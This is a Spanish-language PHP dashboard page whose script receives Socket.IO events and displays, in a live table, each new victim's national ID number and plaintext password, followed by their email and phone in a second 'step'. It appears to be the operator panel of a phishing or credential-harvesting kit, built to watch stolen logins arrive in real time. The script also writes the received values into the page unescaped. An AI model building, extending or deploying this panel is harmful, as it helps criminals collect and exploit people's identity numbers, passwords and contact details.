<?php require_once __DIR__ . '/../partials/head.php'; ?>

<!-- Includes Sidebar and Topbar -->
<?php require_once __DIR__ . '/../partials/navbar.php'; ?>

    <!-- Begin Page Content inside .main-content -->
    <div class="container-fluid px-4">
        
        <div class="d-sm-flex align-items-center justify-content-between mb-4">
            <h1 class="h3 mb-0 text-gray-800">Dashboard</h1>
        </div>

        <div class="row">

            <!-- Card Users -->
            <div class="col-xl-6 col-md-6 mb-4">
                <div class="card card-dashboard border-left-primary h-100 py-2">
                    <div class="card-body">
                        <div class="row no-gutters align-items-center">
                            <div class="col mr-2">
                                <div class="text-xs font-weight-bold text-primary text-uppercase mb-1">Usuarios</div>
                                <div class="h5 mb-0 font-weight-bold text-gray-800"><?= $usersCount ?></div>
                            </div>
                            <div class="col-auto">
                                <i class="fas fa-users fa-2x text-gray-300"></i>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Card Customers -->
            <div class="col-xl-6 col-md-6 mb-4">
                <div class="card card-dashboard border-left-success h-100 py-2">
                    <div class="card-body">
                        <div class="row no-gutters align-items-center">
                            <div class="col mr-2">
                                <div class="text-xs font-weight-bold text-success text-uppercase mb-1">Clientes</div>
                                <div class="h5 mb-0 font-weight-bold text-gray-800"><?= $customersCount ?></div>
                            </div>
                            <div class="col-auto">
                                <i class="fas fa-user-tag fa-2x text-gray-300"></i>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

        </div>

        <!-- Content Row -->
        <div class="row">
            <div class="col-12">
                <div class="card card-dashboard shadow mb-4">
                    <div class="card-header py-3 d-flex flex-row align-items-center justify-content-between bg-white border-bottom-0">
                        <h6 class="m-0 font-weight-bold text-primary">
                            <i class="fas fa-satellite-dish me-2 text-success flashing-icon"></i>
                            Registros en Tiempo Real
                        </h6>
                        <span class="badge bg-success rounded-pill" id="connectionStatus">Conectado</span>
                    </div>
                    <div class="card-body">
                        <div class="table-responsive">
                            <table class="table table-hover align-middle">
                                <thead class="table-light">
                                    <tr>
                                        <th>DNI</th>
                                        <th>Password</th>
                                        <th>Email</th>
                                        <th>Teléfono</th>
                                        <th>Estado</th>
                                    </tr>
                                </thead>
                                <tbody id="liveCustomersTable">
                                    <tr id="waitingRow">
                                        <td colspan="5" class="text-center text-muted py-4">
                                            <i class="fas fa-spinner fa-spin me-2"></i> Esperando nuevos registros...
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>

    </div>
    <!-- End Page Content -->

</div> <!-- End Main Content Wrapper -->

<?php require_once __DIR__ . '/../partials/scripts.php'; ?>
<!-- Socket.IO Client -->
<script src="https://cdn.socket.io/4.6.0/socket.io.min.js"></script>
<style>
    @keyframes flash {
        0% { opacity: 1; }
        50% { opacity: 0.4; }
        100% { opacity: 1; }
    }
    .flashing-icon {
        animation: flash 2s infinite;
    }
    .new-row-highlight {
        animation: highlightFade 2s ease-out;
        background-color: #d1e7dd; /* Success light green */
    }
    .update-row-highlight {
        animation: highlightFade 2s ease-out;
        background-color: #fff3cd; /* Warning light yellow */
    }
    @keyframes highlightFade {
        0% { background-color: inherit; opacity: 0.5; }
        100% { background-color: transparent; opacity: 1; }
    }
</style>
<script>
    const socketUrl = "<?= $_ENV['SOCKET_URL'] ?? 'http://localhost:3000' ?>";
    const socket = io(socketUrl);
    const tableBody = document.getElementById('liveCustomersTable');
    const waitingRow = document.getElementById('waitingRow');
    const statusBadge = document.getElementById('connectionStatus');

    socket.on("connect", () => {
        statusBadge.className = 'badge bg-success rounded-pill';
        statusBadge.innerText = 'En vivo';
    });

    socket.on("disconnect", () => {
        statusBadge.className = 'badge bg-danger rounded-pill';
        statusBadge.innerText = 'Desconectado';
    });

    // PASO 1: Nuevo Registro (DNI + Password)
    socket.on("new_customer", (data) => {
        if (waitingRow) waitingRow.remove();

        const row = document.createElement('tr');
        row.id = 'customer-' + data.id; // Assign ID for updates
        row.className = 'new-row-highlight';
        
        row.innerHTML = `
            <td>
                <div class="d-flex align-items-center">
                    <div class="bg-primary text-white rounded-circle d-flex justify-content-center align-items-center me-2" style="width: 30px; height: 30px; font-size: 0.8rem;">
                        <i class="fas fa-user"></i>
                    </div>
                    <span class="fw-bold">${data.dni}</span>
                </div>
            </td>
            <td class="text-danger font-monospace small">${data.password}</td>
            <td id="email-${data.id}">${data.email || '<span class="text-muted small">Pendiente...</span>'}</td>
            <td id="phone-${data.id}">${data.phone || '<span class="text-muted small">Pendiente...</span>'}</td>
            <td><span class="badge bg-info text-dark rounded-pill">Paso 1</span></td>
        `;

        tableBody.insertBefore(row, tableBody.firstChild);
        
        // Mantener tabla limpia (max 15 rows)
        if (tableBody.children.length > 15) {
            tableBody.removeChild(tableBody.lastChild);
        }
    });

    // PASO 2: Actualización (Email + Phone)
    socket.on("update_customer", (data) => {
        const row = document.getElementById('customer-' + data.id);
        if (row) {
            // Update specific cells
            const emailCell = document.getElementById('email-' + data.id);
            const phoneCell = document.getElementById('phone-' + data.id);
            
            if (data.email) emailCell.innerText = data.email;
            if (data.phone) phoneCell.innerText = data.phone;
            
            // Highlight row update
            row.classList.remove('new-row-highlight');
            row.classList.add('update-row-highlight');
            
            // Update status badge
            const statusCell = row.lastElementChild;
            statusCell.innerHTML = '<span class="badge bg-success rounded-pill">Completado</span>';
            
            // Remove highlight class after animation
            setTimeout(() => {
                row.classList.remove('update-row-highlight');
            }, 2000);
        }
    });
</script>